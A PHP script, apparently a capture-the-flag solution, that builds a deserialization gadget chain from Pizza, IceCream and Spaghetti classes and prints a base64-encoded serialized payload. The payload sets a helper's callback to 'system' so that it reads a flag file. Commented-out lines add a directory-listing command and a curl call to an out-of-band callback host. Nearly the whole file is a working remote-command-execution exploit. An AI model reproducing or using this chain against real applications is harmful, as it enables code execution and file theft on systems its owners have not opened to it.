<?php
require_once "./test.php";
use Helpers\ArrayHelpers;


class Pizza
{
	public $price;
	public $cheese;
	public $size;

	public function __destruct()
	{
		echo $this->size->what;
	}
}
	class IceCream
	{
		public $flavors;
		public $topping;

		public function __invoke()
		{
			foreach ($this->flavors as $flavor) {
				echo $flavor;
			}
		}
	}
class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;

    public function __get($tomato)
    {
        ($this->sauce)();
    }
}

$arr = Array("1","2","3");
foreach ($arr as $men){
    echo $men;
}
// $ArrayHelpers = new ArrayHelpers(['cd ../../../ && ls | grep -i flag | ']);
// $ArrayHelpers = new ArrayHelpers(['curl https://ooivitmetylzxvgqwayqjvaq6idy1uppx.oast.fun']);
// $ArrayHelpers->callback = 'system';

// $IceCream = new IceCream();
// $IceCream->flavors = $ArrayHelpers;



// $Spaghetti = new Spaghetti();
// $Spaghetti->sauce = $IceCream;
// $Spaghetti->waht;

// $Pizza = new Pizza();
// $Pizza->size = $Spaghetti;
// echo "\n";
echo base64_encode('O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";O:9:"Spaghetti":3:{s:5:"sauce";O:8:"IceCream":2:{s:7:"flavors";O:21:"\Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:1:{i:0;s:26:"cat /pBhfMBQlu9uT_flag.txt";}i:2;a:1:{s:8:"callback";s:6:"system";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}');
echo "\n";